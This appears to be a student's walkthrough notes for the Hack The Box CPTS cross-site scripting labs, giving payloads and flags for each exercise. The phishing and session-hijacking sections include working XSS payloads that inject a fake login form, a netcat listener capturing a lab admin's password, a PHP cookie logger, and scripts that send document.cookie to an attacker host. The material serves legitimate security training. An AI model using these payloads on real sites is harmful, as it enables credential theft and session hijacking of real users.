---
title: CPTS labs - 18 Cross-Site Scripting XSS
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - certification
  - CPTS
  - labs
---
# CPTS labs - 18 Cross-Site Scripting XSS
## [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/module/details/103)

### XSS Basics

####  Stored XSS


**To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.**

```
<script>alert(document.cookie)</script>
```

Results:  HTB{570r3d_f0r_3v3ry0n3_70_533}


####  Reflected XSS


**To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.**

```
http://83.136.253.163:57837/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

Results: HTB{r3fl3c73d_b4ck_2_m3}

####  DOM XSS

 To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.
 
```
# Enter <img src="" onerror=alert(document.cookie)>
```

Results: 


####  XSS Discovery

**Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?**

```
# Enter http://$ip:$port/?fullname=lolo&username=lala&password=lalala&email=%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

Results: email


**What type of XSS was found on the above server? "name only"**

Results:  Reflected

### XSS Attacks

#### Phishing 

**Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.**

Creating a valid payload in http://10.129.148.221/phishing/index.php?url= This would be the payload:

```
\`/'</script/--!><h3>Please login to continue</h3><form action=http://10.10.14.198>    <input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>
```

This would be the link generated:

```
http://10.129.148.221/phishing/index.php?url=%5C%60%2F%27%3C%2Fscript%2F--%21%3E%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.14.198%3E++++%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E

```

Starting a netcat listener:

```
sudo nc -lvnp 80
```

Visiting http://10.129.148.221/phishing/send.php and entering the link generated.

In the netcat  listener we obtain:

```
listening on [any] 80 ...
connect to [10.10.14.198] from (UNKNOWN) [10.129.148.221] 46802
GET /?username=admin&password=p1zd0nt57341myp455&submit=Login HTTP/1.1
Host: 10.10.14.198
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: HTBXSS/1.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.129.148.221/
Accept-Encoding: gzip, deflate
Accept-Language: en-US

```

We use the creds for accessing to /phishing/login.php and grabbing the flag

Results: HTB{r3f13c73d_cr3d5_84ck_2_m3}

#### Session Hijacking

**Try to repeat what you learned in this section to identify the vulnerable input field and find a working XSS payload, and then use the 'Session Hijacking' scripts to grab the Admin's cookie and use it in 'login.php' to get the flag.**

Create a file index.php in the attacker machine:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Have a php server listening:

```bash
sudo php -S 0.0.0.0:80
```


Enter $ip/hijacking and enter this payload in every field. Use the field name (username, name, surname...) as `<custom.name>` when different payloads:

```html
<script>document.location=%27http://attackerIP/index.php?c=%27+document.cookie</script>
```



If successful, you will see a connection in your php server like this:

![xss blind](img/xss_blind_00.png)

Then, `profile` would be the vulnerable input (parameter `imgurl`). The URL:

```
http://VICTIMIP/hijacking/?fullname=Lala%20lalasurname%2Ffullname%3C%2Fscript%3E&username=%22%3E%3Cscript+src%3Dhttp%3A%2F%2FAttackerIP%2Fusername%3C%2Fscript%3E&password=lala&email=lala%40gmail.com&imgurl=%22%3E%3Cscript%20src=%22http://AttackerIP/lala.js%22%3E%3C/script%3E
```

Beside the index.php, have a lala.js in your php server:

```js
new Image().src='http://attackerIP/index.php?c='+document.cookie
```

Run your php server:

```bash
sudo php -S 0.0.0.0:80
```

Now, we can change the URL in the XSS payload we found earlier to use `lala.js`. For instance:

```html
<script src=http://attackerIP/lala.js></script>
```

You will log the following activity in your php server:

![xss blind](img/xss_blind_02.png)


Results:  HTB{4lw4y5_53cur3_y0ur_c00k135}


### XSS Prevention

####  Skills Assessment


**What is the value of the 'flag' cookie?**

Enter payload in all form fields. The vulnerable one is `website` with the payload

```html
<script src='http://attackerIP/website'></script>
```

I have a php server running, with this index.php:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

I know that it is the parameter `webserver` because of this:

![xss_blind_01](img/xss_blind_01.png)

Now, I have also this file lala.js in my server:

```
<script src='http://attackerIP/lala.js'></script>
```

And in my php server:

![xss_blind_03](img/xss_blind_03.png)

Results:  HTB{cr055_5173_5cr1p71n6_n1nj4}


